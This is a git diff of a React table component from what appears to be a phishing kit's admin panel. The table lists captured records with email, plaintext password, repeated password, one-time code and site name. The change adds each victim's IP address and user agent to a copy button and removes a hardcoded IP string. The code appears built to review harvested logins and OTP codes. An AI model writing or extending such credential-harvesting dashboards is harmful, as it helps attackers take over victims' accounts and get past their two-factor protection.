@@ -7,7 +7,7 @@ import useInformation from "../../hooks/useInformation";
 
 
 const InformationTable = () => {
-  const {loading,setIsRefresh,info,role} = useInformation()
+  const {loading,setIsRefresh, displayInfo,role} = useInformation()
  
 
   return (
@@ -76,7 +76,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              info?.map(({ user, updatedAt, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt,agent:{ip,userAgent}, email, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -118,10 +118,9 @@ const InformationTable = () => {
                   <td className="px-2 py-1 font-bold cursor-pointer ">
                     <div className="relative inline-block">
                       <button
-                        onClick={() => handleCopyClick('103.204.210.152,152.210.204.103-level3carrier.net,Asia/Dhaka')}
+                        onClick={() => handleCopyClick(`${(ip && userAgent) && (ip +'/'+userAgent)}`)}
                         className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                           }`}>Copy</button>
-                      <div className="tooltip" > 103.204.210.152,152.210.204.103-level3carrier.net,Asia/Dhaka</div>
                     </div>
                   </td>
                   <td onClick={() => handleCopyClick(formatUtcToLocal(updatedAt))} className="px-2 py-1 font-bold cursor-pointer">
